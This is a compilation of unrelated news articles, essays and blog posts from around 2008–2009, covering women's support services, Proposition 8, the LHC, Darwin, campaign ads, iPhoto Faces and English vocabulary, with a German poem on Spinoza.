Research published by the Equality Commission and the End Violence Against Women Campaign suggests there is a major funding gap for facilities such as rape crisis centres which help women escape violence and abuse .
The study , called the " Map of Gaps , " charts services across Britain and suggests more than 100 local authorities , a quarter of the total , have no specialised help at all .
Underfunded
The worst provision per head of population is in the east and south east of England and the best provision is in Bradford .
But the research found Glasgow had the best provision in the whole of Britain because women 's safety had been made a priority there .
Chair of the Equality Commission , Trevor Phillips , is writing to the areas where there are no services to say unless they have a good explanation he will take legal action .
He said : " In many parts of the country services for women who have experienced violence are chronically under - funded or simply do not exist .
" Women should n't be subjected to this postcode lottery ... for those councils who continue to ignore the dire need to shore up services and plug the gaps we have a stark reminder : the commission is ready and willing to use its enforcement powers . "
The Local Government Association described the study as " irresponsible and alarmist " .
' No help ' Cllr Ann Lucas , LGA spokeswoman on domestic violence , said women and men who experienced violence did not just get help and support from councils .
" Councils work with other organisations like the police , the health service and voluntary organisations in order to make sure women get the support they need , when they need it , " she said .
" There is a responsibility on councils to consider what services are needed in their area to support women and men who experience violence .
If the council decides there are enough existing services being provided by other organisations , they wo n't provide a service just for the sake of it .
" Writing a letter to 100 councils asking why they have no specialised services and pursuing them in the courts will be of no help to anybody . "
In addition to the threat of legal action , the Commission is launching an online interactive " Map of Gaps , " which enables the public to find out about provision in their area and lobby their MP and local authorities to press for more investment in these vital services .

Contains the electronic versions of 80 books previously published in hard copy as part of the Country Studies Series by the Federal Research Division .
Intended for a general audience , books in the series present a description and analysis of the historical setting and the social , economic , political , and national security systems and institutions of select countries throughout the world .
Most books in the series deal with a single foreign country , but a few cover several countries or a geographic region .
The series includes several books on countries that no longer exist in their original configuration — such as Czechoslovakia , East Germany , the Soviet Union , Sudan , and Yugoslavia .
These books remain in the series because they continue to offer valuable historical information and perspective .
In some cases , studies on successor states are also part of the series .
Each book was written by a multidisciplinary team of social scientists , who sought to adhere to accepted standards of scholarly objectivity .
The books represent the analysis of the authors and should not be construed as an expression of an official U.S. government position , policy , or decision .
Months before the first ads would run on Proposition 8 , San Francisco Catholic Archbishop George Niederauer reached out to a group he knew well , Mormons .
Niederauer had made critical inroads into improving Catholic - Mormon relations while he was Bishop of Salt Lake City for 11 years .
And now he asked them for help on Prop.
8 , the ballot measure that sought to ban same - sex marriages in California .
The June letter from Niederauer drew in the Church of Jesus Christ of Latter - day Saints and proved to be a critical move in building a multi-religious coalition - the backbone of the fundraising , organizing and voting support for the successful ballot measure .
By bringing together Mormons and Catholics , Niederauer would align the two most powerful religious institutions in the Prop. 8 battle .
Ironically , it made San Francisco , center of the nation 's gay community , a nexus in the fight against the recently gained gay right to marry .
This Catholic - Mormon alliance was part of a broad pattern that underscored a critical difference between the rival campaigns :
Yes on 8 sought to marshal support among many religions , while the No on 8 campaign often put religion on the sidelines .
" People of faith , really of every faith , believed that marriage was between man and a woman , " said Frank Schubert , political consultant to the Yes on 8 campaign .
" They formed the core of our volunteer operation .
They were largely responsible for the 70,000 contributions we got . "
Some clergy within the No on 8 campaign believed not enough respect was paid to religion .
" Their focus really was n't upon communities of faith , " said the Rev. Roland Stringfellow , who works with the Center for Gay and Lesbian Studies at the Pacific School of Religion in Berkeley and was an active organizer in the No on 8 campaign .
Stringfellow said
No on 8's relative neglect of religion had a particularly profound effect on Latinos and African Americans , who hold strong religious views .
" I really did n't note particular outreaches to communities of color . "
Exit polls data
Exit polls show that religious views had a profound effect on the result , spanning racial lines :
-- 84 percent of those who attend church weekly voted yes .
-- 81 percent of white evangelicals voted yes .
-- 65 percent of white Protestants voted yes .
-- 64 percent of Catholics voted yes .
Catholics accounted for 30 percent of all voters .
A late push by many churches to win over their congregations played a decisive role in increasing turnout and swaying opinion , said Mark DiCamillo , director of the Field Poll , who analyzed the figures .
The last Field Poll , conducted a week before the election , showed that weekly churchgoers increased their support in the final week from 72 percent to 84 percent .
Catholic support increased from 44 percent to 64 percent - a jump that accounted for 6 percent of the total California electorate and equivalent to the state 's entire African American population combined .
The shift in Catholics alone more than accounted for Prop.
8 's 5 percent margin of victory .
" The Sunday before the election is just a very influential time for churchgoers , " said DiCamillo .
For religious conservatives , " there was a lot of interest and attention and concern on this whole issue , but they brought it to a big conclusion on the final weekend . "
Stringfellow , who organized No on 8 religious events in the East Bay and San Francisco , said the No on 8 campaign 's talking points initially did n't have language to address religious groups .
In addition , he said , No on 8 campaigners were told by strategists not to discuss children , an issue that has particular significance for family - oriented religious groups .
Missed opportunities
Stringfellow believes the campaign was afraid it would get smeared by allegations tying homosexuality to pedophilia .
But he believes it was wrong to avoid the subject of children because gays and lesbians are just as capable as straight people of being good parents .
" When the Yes on 8 folks talked about children , we really did n't have anywhere to go with it , " he said .
Stringfellow said the No on 8 campaign was wrong to downplay lesbian , gay , bisexual and transgender couples in advertisements .
" It 's not going to be normalized if you hide over here in the corner , " he said .
" There 's nothing wrong with talking about love between two individuals . "
The future for the religious coalition that supported Prop. 8 is unclear .
" I do n't know if it could be assembled again , " said Schubert , the Yes on 8 consultant .
" It came together because of the unique nature of marriage , and how it carries across every ideological and theological boundary . "
Mormon church members undertook a perhaps unprecedented mobilization , contributing an estimated 40 percent of the individual donations made to the Yes on 8's $ 30 million - plus campaign .
Yet the Salt Lake City church , which did not contribute to the campaign , sees its involvement in politics as unusual .
" I do n't think there 's any sense in the church that this coalition has more life beyond this one issue , " said Mike Otterson , a church spokesman .
" We have n't created a permanent alliance of churches here .
What we did here was we came together to protect traditional marriage . "
Israeli soldiers examine the remains of a rocket fired from Lebanon
A rocket fired from Lebanon has lightly wounded three people in northern Israel , the Israeli army says .
Lebanese security sources said that three rockets had been fired from southern Lebanon but two had landed inside Lebanese territory .
Lebanese sources say that Israel then fired at least six artillery shells .
Fouad Siniora , the Lebanese Prime Minister , denounced both attacks .
No-one has claimed responsibility for the rocket firing .
A Lebanese source told Reuters that rockets had been fired from the area of Mansouri , south of Tyre , towards Israel .
A woman is reported to have been injured by flying glass in her home when the rocket landed near the Israeli town of Maalot near the Lebanese border .
Masad , an Israeli man , described hearing the Katyusha rocket hit his village .
" I was sleeping and I heard something like a bomb , I did not know what it was .
I got up and saw , after a while , police around .
I got out and saw something unbelievable , a Katyusha , " he said .
A spokesman for the Magen David Adom ambulance service said the three wounded had been taken to hospital .
The Israeli army said it had fired shells in response to the rocket attack .
' Unjustified '
The Lebanese prime minister denounced both attacks .
" The Israeli shelling is an unacceptable and unjustified violation of Lebanese sovereignty , " he said in a statement .
" The rockets launched from Lebanon threaten the country 's security and stability and constitute a violation of UN Security Council Resolution 1701 . "
Resolution 1701 ended the 2006 war between Hezbollah and Israel .
During the recent conflict in Gaza , rockets from Lebanon were fired into Israel twice .
Hezbollah denied responsibility for those rockets , suspected to have been fired by Palestinian militants .
The Internet TESL Journal Gender Differences in E-mail Communication Paolo Rossetti

Introduction
This article examines the implications of gender differences on language use in electronic mail discussion groups .
In order to arrive at an analysis of gender - related language differences in this medium , we will first draw on more general gender concerns .
Language and Gender
Language , culture and society interact to give members of different genders different levels of power and recognition in society .
The different way boys and girls are socialized has significant ramifications on the way they communicate as adults because this encoding of social behavior is carried on into adulthood .
In other words , it is consistently reflected in the different social and communicative styles of women and men .
According to Tannen ( 1995:138 ) , " communication is n't as simple as saying what you mean .
How you say what you mean is crucial , and differs from one person to the next , because using language is a learned behavior : how we talk and listen are deeply influenced by cultural expectations " .
Women and men are like people who have grown up in two subcultures - they have two broad different styles of speaking and establishing social status .
In the process of socializing with peers , children generally tend to play with other children of the same gender , resulting in different ways of creating rapport and negotiating status within their group : childhood play is where much of our conversational style is learned ( Tannen , 1995:138 ) .
The main distinction between the way boys and girls communicate is that girls generally use the language to negotiate closeness - that is , to establish intimacy as a basis of friendship ( collaboration - oriented ) ; and , in comparison , boys generally use language to negotiate their status in the group ( competition - oriented ) .
The theme of using power to negotiate status by males and cooperation to establish rapport by females is consistently played out throughout adulthood and repeated in the social and linguistic communicative styles between the two sexes at all levels : at home , work , meetings , social occasions , and in personal , casual and formal contacts .
Consequently women and men tend to have different habitual ways of saying what they mean .
E-mail Communication
An appropriate forum in which to consider these assumptions would be one in which there is no interference in the form of interruptions , oral / aural markers , restrictions of topics or any sort of physical contact .
One where both genders are welcome and encouraged to participate in the topic at hand : a forum where the gender of the contributors is irrelevant and can only be discerned by the voluntary addition of a name by the participant .
Such a forum would be electronic mail discussion groups , also called electronic mailing lists .
( Shea : 1994 , 26 )
Electronic mail discussion groups exist in the tens of thousands on every possible topic imaginable .
These are groups of people - some groups in excess of 35,000 participants - who for the most part never physically meet .
They communicate with one another through e-mail , offering opinions and advice with regards to the topic at hand .
Part of the great success of e-mail discussion groups has been the fact that participants must actually subscribe in order to be able to post their messages , therefore practically eliminating the disturbances created in Usenet groups ( no subscription required ) where anyone could post anything to any list .
( Shea : 1994 , 26 )
Another cause for the enthusiastic growth of e-mail discussion is the format of the messages and the relaxed style of writing required .
Along a continuum with the two extremities marked relaxed spoken language and formal written language , e-mail postings would most probably rank the closest to spoken language than any other written text .
In fact , e-mail is often written as if the message were spoken out with few attempts to edit the text at all - and writing e-mail messages back and forth is often referred to as " holding a conversation online .
" ( Shea : 1994 , 35 ) .
And while the Internet has historically been more welcoming to males than females , Pittaway ( 1997: 1 - 2 ) has found that in 1996 " estimates say 40 to 49 percent of online users are female , up from just 10 percent " in 1993 .
Adding that " 65 percent of women live in households where a personal computer was purchased " between 1995 and 1997 .
It is clear , therefore , that there is no more a great gender gap in computer mediated communication .
According to the results of the surveys published by Pittaway , of the 17 .
6 million people using Internet e-mail in the United States and Canada , just under half would probably be women .
Gender in E-mail Communication
One can only expect there be a noticeable difference in the language used to discuss issues online - in fact an absence of such differences would be surprising when one considers the different upbringing and consequent socialization and integration of individuals of both sexes in society .
In fact , Herring ( 1994 : introduction ) claims that " men and women have recognizably different styles in posting to the Internet " and that " women and men have different communicative ethics " ; in contrast to the understanding that the Internet provides a gender - less , age - less , race - less and any - other - bias - less opportunity for interaction .
( Shea : 1994 , 40 )
In the keynote speech at the American Library Association annual convention in 1994 , Herring ( 1994:3 - 4 ) proposes that this is the case in that " women and men have different characteristic online styles " that echo the differences of culturization and integration into society :
" The male style is characterized by adversiality - put - downs , strong , often contentious assertions , lengthy and / or frequent postings , self - promotion , and sarcasm " ; while the female style , in contrast , is characterized by " supportiveness and attenuation " with expressions of appreciation , thanking , and community - building ; as well as apologizing , expressing doubt , asking questions , and contributing ideas in the form of suggestions . "
It would therefore appear that even though the Internet does offer the theoretical opportunity of equality , in reality women are not provided with an equal opportunity for discussion due to the different communication styles existing between the two sexes - in other words , if women use language that is considered weaker , more frivolous or somewhat less powerful than men , they will continue to be relegated to secondary status by men ; and that if men use a more aggressive , competitive , dominating style , they will continue to remain in power .
Or could it be that as people adapt to the virtual societies of computer communication this female / male dichotomy is no longer valid , and that individuals of both sexes are enabled to choose between both styles at their leisure depending on what their purpose is ?
Could males adopt a more cooperative style of writing if their goal was to secure group support and understanding ?
And could females opt to write in a more traditionally male style to gain prominence and successfully �win� an argument ?
Research
Hence the writer of this paper has undergone a project of informal research into the different styles women and men adopt when contributing to e-mail discussion groups .
Over the span of the third and fourth weeks of May 1997 , a total of 100 e-mail messages were randomly collected from a variety of e-mail groups spanning the following topics : bird watching , politics , auto racing , single parent issues , martial arts , teaching English as a second language , dog training , women�s basketball , fire fighting , ecology , vegetarianism , computer aided software engineering , gardening , civil rights , and women�s religion .
While the data collected for this modest research is presented attached to this paper , there could be certain factors which affect the results .
First of all , the only way the gender of the writer could be determined was through the name placed at the end of the message - therefore 18 messages signed with neutral gender names were discarded ( eg. Jamie , or PK ) , and there is no guarantee that the signature represents the actual gender of the writer ( Paul could sign off as Paula , should he wish to ) .
Secondly , a random selection of 82 messages does not provide a large enough sampling when compared to the thousands of messages produced daily .
Of the 100 e-mail messages collected , as mentioned above , eighteen were discarded , and the remaining 82 were divided according to gender : 46 were written by men , and 36 by women .
Therefore , 56 . 1 % of the messages were written by men , and 43 .
9 % by women - a ratio which quite accurately reflects the percentage of female online users reported by Pittaway .
( 1997:1-2 )
Analysis According to Gender
The analysis undertaken was to identify expressions from both groups which appeared to have an obvious or underlying expression of aggressiveness ( appendix 1 ) or supportiveness ( appendix 2 ) .
Additionally , samples of language expressing opinions ( appendix 3 ) were collected from both groups .
This analysis is based on the assumption of a an aggressive / male , supportive / female dichotomy expressed by Herring .
( 1994:3-4 )
From the data collected , there is a clear difference in the language used by males and females online .
' Aggressive ' expressions recorded in the messages written by men far outnumbered those written by women - in fact , men used a total of twelve separate aggressive or sarcastic expressions , while women used five .
Additionally , men used far more openly aggressive language , including personal attacks and put - downs as well as two references to ' taboo ' body parts .
On the other side of the dichotomy , women used far more expressions offering support and a deepening of their relationship with the readers .
Men used only six ' supportive ' expressions , while women used eighteen .
In addition , women used much more open expressions of appreciation and thanks , while men used ' tighter ' and less direct expressions .
Furthermore , men were found to be more interested in presenting their personal point of view in order to present an ' authoritative ' contribution to the discussion , while women were more interested in the contribution itself .
Conclusion
In conclusion , therefore , there is undeniably a gender difference in styles in e-mail messages posted to electronic discussion groups : males are more prone to write in an aggressive , competitive style , while women tend to be far more supportive in their writing .
The male / female language style dichotomy has been transported into computer communication regardless of the lack of physical contact .
The reason , it seems , lies very much in the different approach taken by women and men towards this new electronic technology - an approach which is congruent with the socialization and integration of males and females into society .
Men apparently see the opportunity provided by this technology as a chance to further one 's own influence , by gaining valuable information and by extending one 's own authority and respect in society ; while women ostensibly view this technology as an opportunity to nurture existing relationships and develop new ones .
Language styles online are different , to a certain extent , because they reflect the different goals of the users .

There is absolutely , positively , definitely no chance of the LHC destroying the planet when it eventually switches on some time later this year .
Right ?
Err , yep .
And yet a few niggling doubts are persuading some scientists to run through their figures again .
And the new calculations are throwing up some surprises .
One potential method of destruction is that the LHC will create tiny black holes that could swallow everything in their path including the planet .
In 2002 , Roberto Casadio at the Universita di Bologna in Italy and a few pals reassured the world that this was not possible because the black holes would decay before they got the chance to do any damage .
Now they ’re not so sure .
The question is not simply how quickly a mini- black hole decays but whether this decay always outpaces any growth .
Casadio have reworked the figures and now say that : ” the growth of black holes to catastrophic size does not seem possible . ”
Does not seem possible ?
That ’s not the unequivocal reassurance that particle physicists have been giving us up till now .
What ’s more , the new calculations throw up a tricky new prediction .
In the past , it had always been assumed that black holes would decay in the blink of an eye .
Not any more .
Casadio and co say : “ the expected decay times are much longer ( and possibly ≫ 1 sec ) than is typically predicted by other models ”
Whoa , let ’s have that again : these mini black holes will be hanging around for seconds , possibly minutes ?
That does n’t sound good .
Anybody at CERN care to clarify ?

Zu Spinozas Ethik
Wie lieb ich diesen edlen Mann
Mehr als ich mit Worten sagen kann .
Doch fürcht ' ich , dass er bleibt allein
Mit seinem strahlenen Heiligenschein .
So einen armen kleinen Wicht
Den führst du zu der Freiheit nicht
Der amor dei lässt ihn kalt
Das Leben zieht ihn mit Gewalt
Die Höhe bringt ihm nichts als Frost
Vernunft ist für ihn schale Kost
Besitz und Weib und Ehr ' und Haus
Das füllt ihn von oben bis unten aus
Du musst schon gütig mir verzeih'n
Wenn hier mir fällt Münchhausen ein
Dem als Einzigem das Kunststück gedieh'n
Sich am eigenem Zopf aus dem Sumpf zu zieh'n
Du denkst sein Beispiel zeiget uns eben
Was diese Lehre dem Menschen kann geben
Mein lieber Sohn , was fällt dir ein ?
Zur Nachtigall muss man geboren sein
Vertraue nicht dem tröstlichen Schein :
Zum Erhabenen muss man geboren sein .

On Spinoza 's Ethics
How I love this noble man
More than I can say with words .
Still , I fear he remains alone
With his shining halo .
Such a poor small lad
Whom you 'll not lead to freedom
The amor dei leaves him cold
Mightily does this life attract him
Loftiness offers him nothing but frost
Reason for him is poor fare
Property and wife and honor and house
That fills him from top to bottom
You 'll kindly forgive me
If Münchhausen here comes to mind
Who alone mastered the trick
Of pulling himself out of a swamp by his own pigtail
You think his example would show us
What this doctrine can give humankind
My dear son , what ever were you thinking ?
One must be born a nightingale
Trust not the comforting façade
One must be born sublime

Diane Benson gets the nod for the footage – perhaps a first in political history – of a candidate scooping up dog poop in her backyard .
The 10 worst ads of the season
These ads subtract .
Politico asked campaign operatives on both sides to nominate their favorite commercials of the cycle — and by favorite , we mean the most memorably bad .
Advertisement
This was a bipartisan exercise .
Offered anonymity , some Democrats nominated Democratic ads and some Republicans chose GOP ads .
Ineptitude , as we discovered , knows no party .
Ours was no exercise in truth squadding .
We were n’t looking for ads that were unfair , fact - flouting , insensitive or commercials that otherwise injured our civil society .
We asked for those that were poorly executed , dopey , misguided or just plain weird .
Narrowing the list to 10 was n’t easy .
Here they are , in no particular order :
1. Diane Benson ( D - Alaska ) “ Experience . ” Benson , a Democrat running for Alaska ’s at - large seat , made a handful of curious spots , so choosing one was difficult .
“ Experience , ” gets the nod for its footage – perhaps a first in political history — of the candidate scooping up dog poop in her backyard .
We ’re still not sure what she was trying to say — maybe she was trying to secure the dog vote .
Then again , we do n’t pretend to understand Alaska politics .
2. Colleen Callahan ( D - Ill . ) “ Daisy . ” LBJ had the good sense to run his infamous “ Daisy ” ad — the one where a little girl picking petals off a flower is annihilated by a nuclear explosion — once .
Here ’s Democrat Colleen Callahan suggesting Daisy could get wiped out by her opponent ’s support of nuke sales to Taiwan .
Added bonus : her easy - listening campaign jingle .
3. Jim Slattery ( D - Kan . ) “ Hosed . ”
We ’re not sure what it is about candidates and bodily waste this cycle .
But Slattery ’s ad makes the list for its suggestion — and gag - inducing dramatization — of voters getting whizzed on .
The end of the ad makes clear they ’re only being doused in gasoline .
Slattery ’s running against Kansas Republican Sen. Pat Roberts —
Is it a coincidence that the man holding the hose looks like Roberts ?
4. Sen. John Cornyn ( R - Texas ) “ Big , Bad John . ”
After the ad went viral , Cornyn said , “ My staff convinced me that it would be a good idea …
Maybe I need a new staff . ”
Yeah , maybe .
Correction : Cornyn staff has written in to Politico to clarify that this clip was not created as an ad but rather to be played at the Texas Republican Convention .
It was later put online , where it went viral , but Cornyn ’s comment that maybe he needed a new staff was said at the convention , not after it went viral .
5. Carl Mumpower ( R - N.C. ) “ Glasses . ”
Mumpower , an eerily sedate self - described “ independent ” Republican , ca n’t seem to decide if he wants his glasses on or off .
It ’s mesmerizing .
6. Tom Feeney ( R - Fla . )
“ I ’m sorry . ”
This ad — like Benson ’s — was nominated by political operatives on both sides of the aisle .
The Florida Republican apologizes for going on a junket to Scotland paid for by “ a corrupt lobbyist , ” Jack Abramoff .
“ Public service is about being honest , even when you make a mistake , ” Feeney earnestly tells his constituents .
But is he really sorry — or just sorry he got busted ?
“ I embarrassed myself , embarrassed you , and for that I ’m sorry , ” he intones .
We ’ll find out Nov. 4 if his constituents accepted the mea culpa .
7. Andy Harris ( R - Md. ) “ Recycler . ”
This one makes it on sheer laziness .
We can accept the occasional campaign volunteer serving as the “ man on the street ” for his or her candidate .
But Harris took it to a new level – recycling the same exact people — and using the same exact footage — to attack both his primary opponent Rep.
Wayne Gilchrest and his general election opponent , Frank Kratovil .
The cherry is the ad ’s title : “ What people are saying about Frank Kratovil . ”
“ Just too liberal , ” says one guy in a warehouse .
“ He is a big spender , ” says a woman in a grocery store .
Both clips are from the Gilchrest ad .
Andy Harris on Gilchrest and Kratovil
8. Bill Cassidy ( R - La . ) “ Damp . ”
The ad begins with Cassidy ’s wife pull - starting a generator – for no obvious reason — and yelling , “ Okay , Bill ! ” Cassidy then begins an anti-earmark , drill - now spiel in the rain , under an umbrella , again with no explanation .
Maybe it had something to do with Katrina .
The ad – the candidate ’s first – has been taken down from the campaign ’s YouTube page .
But we dug it back up .
9. Rep. Paul Kanjorski ( D - Pa . ) “ Workers . ” State of the art ad – during the Ford administration .
The awkward shoulder pat in the beginning , Kanjorski ’s slow - mo spin toward the camera and the scripted testimonials can’t be moving too many swing voters to do anything more than snicker .
10 . Harri Anne Smith ( R - Ala . ) “ Shabby Sheikh . ”
This ad makes the list for its jarring shift from an Alabama grocery store to Middle Eastern oil fields , along with the line , “ It ’s about time those billionaire Middle Eastern sheiks show us some gratitude by lowering their oil prices . ”
The Best ad of the season .
All 2:51 of it .
Darwin : shy teen , med school dropout , dad of 10 200TH BIRTHDAY
Charles Darwin in 1875 .
Charles Darwin in 1875 .

For a scientist who wrote the most important work on evolutionary biology the world has known , it 's hard to believe what a drifting start Charles Darwin had toward greatness .
A dropout from medical school who avoided becoming an Anglican parson , the shy teenager was far more devoted to geologizing around England 's rocks and rills , and collecting beetles , worms and curious plants - an obsession that began when he was barely 8 years old - than he was to his university classrooms .
But by 25 , Darwin was widely recognized as a talented naturalist , so much so that Robert FitzRoy , commander of the survey ship HMS Beagle , took him on as the " gentleman naturalist " for an exploring voyage around the world .
Darwin suffered from seasickness every day aboard the Beagle , but spent nearly three years happily hiking on land exploring mountains , jungles and the pampas , collecting fossils , birds and plants and describing in detail the geology of a continent wracked by earthquakes .
Back home in England and by virtue of his family 's wealth , Darwin was free to pursue his science , amass data , compile detailed notebooks , publish volumes on his varied natural science discoveries from the Beagle voyage and talk - endlessly - with colleagues in London about his growing insights into the origin of species .
But the pace soon exhausted him , and by age 29 he was sick with stomach pains and heart trouble - problems that plagued him much of the rest of his life .
A year later he married his cousin Emma Wedgwood , and the marriage was a great success .
The couple had 10 children in all , but two died in infancy , and when their daughter Annie died at 10 it threw Darwin into a deep depression .
But as the other children grew , their father loved to roister with them in the family 's final home , Down House , in Kent .
When it came to work , Darwin was unstoppable .
He compared notes with pigeon fanciers , sheep breeders and flower growers and published more notes and more volumes over the years .
Finally , after the naturalist Alfred Russell Wallace sent him an original paper on evolution in 1857 , Darwin 's friends pushed him to publish his own theories .
Two years later , despite his hesitations , " Origin of Species , " his masterwork , was published .
A furor erupted .
It was and is a seminal work , but newspapers scoffed , clergymen ranted , and Anglican Bishop Samuel Wilberforce blasted him .
Darwin continued working and writing and thinking at Down House for 20 years more , but by the winter of 1881 his heart began to give out , and on April 19 , 1882 , at age 73 , he died of a heart attack while visiting London to talk science .
He was buried in Westminster Abbey .

French President Nicolas Sarkozy has criticised Prime Minister Gordon Brown 's economic stimulus plan .
In a debate on French TV , Mr Sarkozy , whose handling of France 's economy has prompted protests , said the UK's VAT cut had " absolutely not worked " .
" Britain is cutting taxes .
That will bring them nothing .
Consumption continues to decrease , " he said .
Downing Street said the French had been in touch to stress the comments were not meant as a critique of UK policy .
But the Conservatives said President Sarkozy was just the latest foreign leader to criticise Gordon Brown 's policies .
' Not a critique ' Shadow chancellor George Osborne said : " We said at the time that Brown 's flagship VAT cut would only make things worse and would be an expensive failure .
That view is now echoed not just by British retailers , but by foreign governments , including France , Germany and Holland , " he said .
" Gordon Brown claims to have saved the world .
It would appear that world leaders increasingly disagree . "
In a 90 minute interview , President Sarkozy defended his plans to revive the French economy , a week after protests and strikes by a million French workers .
I do n't believe that the VAT cut has n't worked
Pat McFadden
Business minister
He made his comments after being asked why France was investing in infrastructure projects not cutting taxes .
Asked about the remarks on Friday , the prime minister 's spokesman said : " The Elysee [ Palace ] have been in contact this morning to assure us that these remarks were not meant as a critique of UK economic policy - which is nice . "
He said that the government had set out its case for a VAT cut and other countries had to decide what was appropriate for their economies .
A Downing Street spokesman later added : " It is important to remember the context in which he was making the comments , which as I understand it , was a domestic debate on television about the way forward for the French economy and French proposals for an economic stimulus . "
' Breathtaking ' BBC political correspondent Carole Walker said there appeared to be some irritation at Downing Street about the comments .
She added it was clear , in the run-up to the G20 summit , that President Sarkozy had a different view to how a fiscal boost should work , than Mr Brown .
Mr Brown 's economic stimulus plans came under fire in December from Germany 's finance minister Peer Steinbruck , who said Britain 's response to the crisis had been " crass " and " breathtaking " .
The Conservatives say the criticisms undermine the government 's claims that other countries were following the UK 's lead over the economy .
The Conservatives and Liberal Democrats have both criticised the year - long reduction in VAT from 17.5 % to 15 % - estimated to cost £ 12bn .
The Tories say it has been an expensive failure , pointing to figures suggesting shopper numbers had fallen .
The Lib Dems said it was a " seriously defective " way of getting money into the economy .
But Downing Street defended the VAT cut , saying recent reports suggested it had stopped sales falling as far as they would otherwise and could be expected to increase sales by 1.2 % over 2009 .
Business and Enterprise Minister Pat McFadden told BBC Radio 4's The World at One : " I do n't believe that the VAT cut has n't worked .
This is something that is going to be in place for the rest of the year .
" I do n't deny for a moment that times are tough in the economy but I think that governments do have to be active .
Many governments around the world are taking a fiscal stimulus . "

So I ’ve been using iPhoto ’09 for about a week now , and I love their face recognition feature .
For years , I ’ve been meaning to use Keywords to tag people in my photos so that I can easily pull up all photos of a certain person , anytime .
I ’m glad I never got around to that because iPhoto ’s new Faces feature does all the hard work for me–it finds faces in my photo library ( 24,310 photos at last count ) .
Then , provided it ’s had some face recognition training , it ’ll ask me if this face is Liz or Nancy or Adam .
It ’s been very easy and I ’ve tagged 69 people so far , including myself in 831 pictures .
The nice thing is once you ’ve tagged a specific person in enough pictures , iPhoto will be very accurate in recognizing that person in any other photos .
We ’re talking about iPhoto finding me in 50 pictures in a row , without any mistakes !
How does iPhoto display all the people you ’ve tagged ?
In their Faces Gallery –here ’s a screenshot from Apple .
Looks wonderful , does n’t it ?
Aside from having friends who double as impossibly ordinary - looking - yet - gorgeous models , we can tell that the user has about 14 people tagged so far in his or her iPhoto library .
So far , so good .
But what happens when you have a lot of people tagged .
Say , 69 friends ?
( I know , it ’s shocking .
Suddenly the pictures are not so pretty or so uniformly sunny .
That ’s what happens when you have non-professionals snapping away with little point - and - shoot cameras . )
But notice that I can only see friends whose first names begin with A through G. I ’ve now got 14 rows of friends to look through–more than 3 full screens to scroll through .
Look at the scroll bar on the right side .
No problem .
i Photo lets you adjust the display size of photos / events / faces using a slider on the lower right corner .
Here ’s the photos again , at their smallest display size .
It ’s not really that much better .
It ’s overwhelming to see so many faces at one time , all against a busy corkboard - patterned background .
Plus , the font size does n’t get smaller .
It ’s still a Marker Felt - esque font , 24 points .
So now many of the names are cut off ; see my name on the first row ?
“ Adam Sto … ” and it ’s not even a long name .
I feel sorry for Jennifer Cole - Regis or Amila Prasanna Kumara .
And the font is terrible if you ’re trying to scan quickly to find a specific name .
At least I can see 35 friends on one screen .
I ’ll still have to do a full scroll to see the rest of my friends ( again , look at the scroll bar on the right ) .
What happens when I go up to 100 friends ?
200 ?
Remember , I ’ve got 24,000 pictures to look through full of college parties , DPHHs , and an entire Sri Lankan school .
Of course I ’m not tagging anybody –just those people whom I think I ’ve got more than 20 pictures of ( ai n’t that a nice barometer ? ) .
Clearly , the iPhoto designers over at Cupertino did n’t think about using iPhoto ’s Faces feature beyond 20 tagged people .
This is an example of not making design futureproof –the principle of thinking , “ So my design will show about 10 rows of data ; what happens in six months when I have 100 rows ? ”
What would work a lot better here is a List View .
Fortunately , iPhoto ’s deisgners have already implemented a similar view in their new Places Gallery :
I know nothing about application design but I ’m guessing it ’s trivial to apply the same List View to the Faces Gallery .
And as a bonus , we should be able to categorize our tagged people .
Say , separate them into “ Family , ” “ Friends , ” “ College , ” “ Australians , ” and so on .
But right now I ’d settle for a simple list of all the people I ’ve tagged , nothing fancy .
I ’ve typed this post in hopes that an iPhoto programmer might come across it and incorporate a List View for iPhoto ’s Faces Gallery in a iLife ’09 update ( I do n’t think this feature should wait until iPhoto ’ 10 ) .
In the meantime , it ’s back to the hard , but fun work of tagging everyone whose visible light projection has passed through my camera ’s aperture .
Scarcely has the new year begun before the calendar pages start filling up with lunch dates promised in Christmas cards and notes - to - self about next time , seriously , getting an earlier start on holiday gift shopping .
But from The Economist comes a reminder of a notable date of an altogether higher order .
Is your stylus poised ?
It 's April 29 , 2009 – plus or minus a few days .
That is when the English language is expected to acquire its millionth word .
This prediction comes from Global Language Monitor , an organization in Austin , Texas , which uses proprietary software to track and analyze trends in language .
" Global English " is its particular focus .
A million words does n't really seem excessive , given 1.35 billion speakers of English on the planet .
That works out to only one word for every 1,350 speakers .
But the decision about just what is " a word " is not always absolutely clear cut .
And just how do you count ?
Is dogs a separate word from dog ?
The Economist exudes skepticism but can't resist at least a brief celebration of the richness of English vocabulary , from the Scottish Highlands to Australia to India .
Among the words to have come into English from India , the Economist piece mentions shampoo .
I might have guessed it had a French background .
( Champoux ? )
Actually , Champoux turns out to be a French surname , and I 've just wandered off to a French - Canadian genealogical site that is ... not on topic .
Where was I ? Shampoo , from the Hindi champo , was first recorded ( 1762 ) as a verb meaning to give a head massage .
A century later it referred to washing hair , and a few years later , it referred to the soap with which one shampooed .
Hmm ... if English did n't have a word for it until basically the mid-1800s , does that mean that perhaps the English - speaking peoples did not have the thing itself ?
Short answer : yes .
The somewhat longer answer : People used ordinary soap to wash hair in earlier times but then had to deal with soapy residues , especially in places with hard water .
No wonder the new compounds that came in during the 1930s seemed like progress .
In its references to Anglo - Indian vocabulary , The Economist makes passing reference to a phrase that may be unfamiliar to some but is worth knowing about : Hobson - Jobson .
As Dictionary.com puts it , it 's " the alteration of a word or phrase borrowed from a foreign language to accord more closely with the ... patterns of the borrowing language , as in English hoosegow from Spanish juzgado . "
You hear a foreign phrase and try to fit it into the language you know , in other words .
The phrase Hobson - Jobson goes back to 1634 , to the early years of the British presence in India , as a mangled Anglicization of what British soldiers thought they were hearing during processions by Muslims during Muharram , an important period of mourning .
The soldiers misheard " Ya Hasan ! Ya Husayn ! " ( " O Hassan ! O Husain ! " ) , a call of mourning for two grandsons of the prophet Muhammad who died fighting for the faith .
" This , " says the Online Etymology Dictionary , " led to the linguists ' law of Hobson - Jobson , describing the effort to bring a new and strange word into harmony with the language . "
The authors of a late 19th - century dictionary of Anglo - Indian vocabulary knew what they were doing when they picked " Hobson - Jobson " as its title .
And the story behind the phrase gives a glimpse of how many layers of understanding human language involves .
Foreign Ministry sources following the plane crash in Buffalo , New York , which left 50 people dead , expressed concerns on Friday for the lives of two Israeli citizens who may have been onboard the aircraft .
The concerns arose after two families contacted the ministry after being unable to contact their loved ones .
